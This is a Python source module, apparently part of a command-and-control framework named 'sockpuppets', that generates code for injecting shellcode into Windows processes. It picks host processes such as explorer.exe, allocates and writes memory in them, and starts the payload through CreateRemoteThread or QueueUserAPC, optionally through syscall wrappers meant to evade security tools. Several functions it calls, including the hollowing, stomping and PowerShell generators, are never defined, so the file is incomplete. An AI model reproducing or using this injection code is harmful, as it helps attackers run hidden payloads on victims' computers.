"""Process injection code generation for sockpuppets C2.

Generates Python (ctypes) and PowerShell (inline C#) code for four injection
techniques: CreateRemoteThread, QueueUserAPC, Process Hollowing, Module Stomping.

All memory/thread operations route through syscall wrappers (evasion.syscalls)
when config.syscalls is set; otherwise they fall back to direct Win32 API calls
via ctypes.windll.kernel32.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from evasion import EvasionConfig


# ---------------------------------------------------------------------------
# Default target processes, ordered by preference
# ---------------------------------------------------------------------------
_DEFAULT_TARGETS = [
    "RuntimeBroker.exe",
    "smartscreen.exe",
    "SearchHost.exe",
    "explorer.exe",
]


# ===================================================================
# Public entry point (called by evasion.__init__.get_evasion_code)
# ===================================================================

def generate_code(lang: str, config: EvasionConfig) -> str:
    """Return injection code for *lang* configured by *config*.

    Returns an empty string for unsupported languages (javascript, vbscript).
    """
    lang = lang.lower()
    if lang == "python":
        return _generate_python(config)
    if lang == "powershell":
        return _generate_powershell(config)
    return ""


# ===================================================================
# Python code generation (ctypes)
# ===================================================================

def _generate_python(config: EvasionConfig) -> str:
    technique = config.inject or "createthread"
    use_syscalls = config.syscalls is not None
    target = config.inject_target
    target_list = _DEFAULT_TARGETS

    parts: list[str] = []

    # ---- Platform guard + imports ----
    parts.append(_py_header(use_syscalls))

    # ---- Constants ----
    parts.append(_py_constants())

    # ---- PROCESSENTRY32 + target finder ----
    parts.append(_py_find_target(target, target_list))

    # ---- API routing helpers ----
    parts.append(_py_api_routing(use_syscalls))

    # ---- Technique-specific code ----
    if technique == "createthread":
        parts.append(_py_createthread())
    elif technique == "apc":
        parts.append(_py_apc())
    elif technique == "hollowing":
        parts.append(_py_hollowing())
    elif technique == "stomp":
        parts.append(_py_stomp())
    else:
        parts.append(_py_createthread())

    # ---- Public inject_shellcode wrapper ----
    parts.append(_py_inject_shellcode(technique))

    return "\n".join(parts)


# -- Python: header --------------------------------------------------------

def _py_header(use_syscalls: bool) -> str:
    lines = [
        "import sys",
        "import ctypes",
        "import ctypes.wintypes as wintypes",
        "import struct",
        "",
    ]
    if use_syscalls:
        lines += [
            "# Syscall wrappers (generated by evasion.syscalls)",
            "# Expected symbols: syscall_alloc, syscall_protect, syscall_write,",
            "#   syscall_create_thread, syscall_open_process, syscall_queue_apc,",
            "#   syscall_set_context, syscall_resume_thread, syscall_unmap_section",
            "",
        ]
    return "\n".join(lines)


# -- Python: constants -----------------------------------------------------

def _py_constants() -> str:
    return (
        "PROCESS_ALL_ACCESS = 0x001FFFFF\n"
        "MEM_COMMIT = 0x00001000\n"
        "MEM_RESERVE = 0x00002000\n"
        "PAGE_READWRITE = 0x04\n"
        "PAGE_EXECUTE_READ = 0x20\n"
        "PAGE_EXECUTE_READWRITE = 0x40\n"
        "CREATE_SUSPENDED = 0x00000004\n"
        "DONT_RESOLVE_DLL_REFERENCES = 0x00000001\n"
        "TH32CS_SNAPPROCESS = 0x00000002\n"
        "TH32CS_SNAPTHREAD = 0x00000004\n"
        "THREAD_SET_CONTEXT = 0x0010\n"
        "THREAD_GET_CONTEXT = 0x0008\n"
        "THREAD_SUSPEND_RESUME = 0x0002\n"
        "CONTEXT_FULL = 0x10001F\n"
        "INFINITE = 0xFFFFFFFF\n"
        "\n"
    )


# -- Python: PROCESSENTRY32 + find_target_process --------------------------

def _py_find_target(explicit_target: str | None, defaults: list[str]) -> str:
    targets_repr = repr(defaults)
    explicit_line = ""
    if explicit_target:
        explicit_line = f'    target_name = "{explicit_target}"\n'

    return (
        "class PROCESSENTRY32(ctypes.Structure):\n"
        "    _fields_ = [\n"
        '        ("dwSize", ctypes.c_ulong),\n'
        '        ("cntUsage", ctypes.c_ulong),\n'
        '        ("th32ProcessID", ctypes.c_ulong),\n'
        '        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),\n'
        '        ("th32ModuleID", ctypes.c_ulong),\n'
        '        ("cntThreads", ctypes.c_ulong),\n'
        '        ("th32ParentProcessID", ctypes.c_ulong),\n'
        '        ("pcPriClassBase", ctypes.c_long),\n'
        '        ("dwFlags", ctypes.c_ulong),\n'
        '        ("szExeFile", ctypes.c_char * 260),\n'
        "    ]\n"
        "\n"
        "\n"
        "class THREADENTRY32(ctypes.Structure):\n"
        "    _fields_ = [\n"
        '        ("dwSize", ctypes.c_ulong),\n'
        '        ("cntUsage", ctypes.c_ulong),\n'
        '        ("th32ThreadID", ctypes.c_ulong),\n'
        '        ("th32OwnerProcessID", ctypes.c_ulong),\n'
        '        ("tpBasePri", ctypes.c_long),\n'
        '        ("tpDeltaPri", ctypes.c_long),\n'
        '        ("dwFlags", ctypes.c_ulong),\n'
        "    ]\n"
        "\n"
        "\n"
        "def find_target_process():\n"
        f"{explicit_line}"
        f"    target_list = {targets_repr}\n"
        "    kernel32 = ctypes.windll.kernel32\n"
        "    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)\n"
        "    if snapshot == -1:\n"
        "        return None\n"
        "    try:\n"
        "        entry = PROCESSENTRY32()\n"
        "        entry.dwSize = ctypes.sizeof(PROCESSENTRY32)\n"
        "        if not kernel32.Process32First(snapshot, ctypes.byref(entry)):\n"
        "            return None\n"
        "        while True:\n"
        '            proc_name = entry.szExeFile.decode("utf-8", errors="ignore").strip("\\x00")\n'
        + (
            "            if proc_name.lower() == target_name.lower():\n"
            "                return entry.th32ProcessID\n"
            if explicit_target
            else
            "            for target_name in target_list:\n"
            "                if proc_name.lower() == target_name.lower():\n"
            "                    return entry.th32ProcessID\n"
        )
        + "            if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):\n"
        "                break\n"
        "    except Exception:\n"
        "        pass\n"
        "    finally:\n"
        "        kernel32.CloseHandle(snapshot)\n"
        "    return None\n"
        "\n"
    )


# -- Python: API routing ---------------------------------------------------

def _py_api_routing(use_syscalls: bool) -> str:
    if use_syscalls:
        return (
            "def api_open_process(access, inherit, pid):\n"
            "    return syscall_open_process(access, inherit, pid)\n"
            "\n"
            "def api_alloc(handle, size, alloc_type=MEM_COMMIT | MEM_RESERVE, protect=PAGE_READWRITE):\n"
            "    return syscall_alloc(handle, size, alloc_type, protect)\n"
            "\n"
            "def api_write(handle, base_addr, buffer, size):\n"
            "    return syscall_write(handle, base_addr, buffer, size)\n"
            "\n"
            "def api_protect(handle, addr, size, new_protect):\n"
            "    return syscall_protect(handle, addr, size, new_protect)\n"
            "\n"
            "def api_create_thread(handle, start_addr, param=0):\n"
            "    return syscall_create_thread(handle, start_addr, param)\n"
            "\n"
            "def api_queue_apc(thread_handle, apc_routine, param=0):\n"
            "    return syscall_queue_apc(thread_handle, apc_routine, param)\n"
            "\n"
            "def api_unmap_section(handle, base_addr):\n"
            "    return syscall_unmap_section(handle, base_addr)\n"
            "\n"
            "def api_set_context(thread_handle, context):\n"
            "    return syscall_set_context(thread_handle, context)\n"
            "\n"
            "def api_resume_thread(thread_handle):\n"
            "    return syscall_resume_thread(thread_handle)\n"
            "\n"
        )
    return (
        "kernel32 = ctypes.windll.kernel32\n"
        "ntdll = ctypes.windll.ntdll\n"
        "\n"
        "def api_open_process(access, inherit, pid):\n"
        "    handle = kernel32.OpenProcess(access, inherit, pid)\n"
        "    return handle\n"
        "\n"
        "def api_alloc(handle, size, alloc_type=MEM_COMMIT | MEM_RESERVE, protect=PAGE_READWRITE):\n"
        "    addr = kernel32.VirtualAllocEx(handle, None, size, alloc_type, protect)\n"
        "    return addr\n"
        "\n"
        "def api_write(handle, base_addr, buffer, size):\n"
        "    written = ctypes.c_size_t(0)\n"
        "    result = kernel32.WriteProcessMemory(handle, base_addr, buffer, size, ctypes.byref(written))\n"
        "    return result\n"
        "\n"
        "def api_protect(handle, addr, size, new_protect):\n"
        "    old_protect = ctypes.c_ulong(0)\n"
        "    result = kernel32.VirtualProtectEx(handle, addr, size, new_protect, ctypes.byref(old_protect))\n"
        "    return result\n"
        "\n"
        "def api_create_thread(handle, start_addr, param=0):\n"
        "    thread_id = ctypes.c_ulong(0)\n"
        "    thread_handle = kernel32.CreateRemoteThread(\n"
        "        handle, None, 0, start_addr, param, 0, ctypes.byref(thread_id)\n"
        "    )\n"
        "    return thread_handle\n"
        "\n"
        "def api_queue_apc(thread_handle, apc_routine, param=0):\n"
        "    return kernel32.QueueUserAPC(apc_routine, thread_handle, param)\n"
        "\n"
        "def api_unmap_section(handle, base_addr):\n"
        "    base = ctypes.c_void_p(base_addr)\n"
        "    return ntdll.NtUnmapViewOfSection(handle, base)\n"
        "\n"
        "def api_set_context(thread_handle, context):\n"
        "    return kernel32.SetThreadContext(thread_handle, ctypes.byref(context))\n"
        "\n"
        "def api_resume_thread(thread_handle):\n"
        "    return kernel32.ResumeThread(thread_handle)\n"
        "\n"
    )


# -- Python: CreateRemoteThread technique ----------------------------------

def _py_createthread() -> str:
    return (
        "def inject_createthread(shellcode, pid):\n"
        "    try:\n"
        "        process_handle = api_open_process(PROCESS_ALL_ACCESS, False, pid)\n"
        "        if not process_handle:\n"
        "            return False\n"
        "        sc_len = len(shellcode)\n"
        "        remote_addr = api_alloc(process_handle, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n"
        "        if not remote_addr:\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        sc_buf = ctypes.create_string_buffer(shellcode)\n"
        "        if not api_write(process_handle, remote_addr, sc_buf, sc_len):\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        if not api_protect(process_handle, remote_addr, sc_len, PAGE_EXECUTE_READ):\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        thread_handle = api_create_thread(process_handle, remote_addr)\n"
        "        if not thread_handle:\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        kernel32.WaitForSingleObject(thread_handle, INFINITE)\n"
        "        kernel32.CloseHandle(thread_handle)\n"
        "        kernel32.CloseHandle(process_handle)\n"
        "        return True\n"
        "    except Exception:\n"
        "        return False\n"
        "\n"
    )


# -- Python: QueueUserAPC technique ----------------------------------------

def _py_apc() -> str:
    return (
        "def enumerate_threads(pid):\n"
        "    thread_ids = []\n"
        "    snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)\n"
        "    if snapshot == -1:\n"
        "        return thread_ids\n"
        "    try:\n"
        "        te = THREADENTRY32()\n"
        "        te.dwSize = ctypes.sizeof(THREADENTRY32)\n"
        "        if not ctypes.windll.kernel32.Thread32First(snapshot, ctypes.byref(te)):\n"
        "            return thread_ids\n"
        "        while True:\n"
        "            if te.th32OwnerProcessID == pid:\n"
        "                thread_ids.append(te.th32ThreadID)\n"
        "            if not ctypes.windll.kernel32.Thread32Next(snapshot, ctypes.byref(te)):\n"
        "                break\n"
        "    except Exception:\n"
        "        pass\n"
        "    finally:\n"
        "        ctypes.windll.kernel32.CloseHandle(snapshot)\n"
        "    return thread_ids\n"
        "\n"
        "\n"
        "def inject_apc(shellcode, pid):\n"
        "    try:\n"
        "        process_handle = api_open_process(PROCESS_ALL_ACCESS, False, pid)\n"
        "        if not process_handle:\n"
        "            return False\n"
        "        sc_len = len(shellcode)\n"
        "        remote_addr = api_alloc(process_handle, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)\n"
        "        if not remote_addr:\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        sc_buf = ctypes.create_string_buffer(shellcode)\n"
        "        if not api_write(process_handle, remote_addr, sc_buf, sc_len):\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        if not api_protect(process_handle, remote_addr, sc_len, PAGE_EXECUTE_READ):\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        thread_ids = enumerate_threads(pid)\n"
        "        if not thread_ids:\n"
        "            kernel32.CloseHandle(process_handle)\n"
        "            return False\n"
        "        queued = False\n"
        "        for tid in thread_ids:\n"
        "            thread_handle = ctypes.windll.kernel32.OpenThread(\n"
        "                THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, False, tid\n"
        "            )\n"
        "            if thread_handle:\n"
        "                if api_queue_apc(thread_handle, remote_addr):\n"
        "                    queued = True\n"
        "                ctypes.windll.kernel32.CloseHandle(thread_handle)\n"
        "        kernel32.CloseHandle(process_handle)\n"
        "        return queued\n"
        "    except Exception:\n"
        "        return False\n"
        "\n"
    )


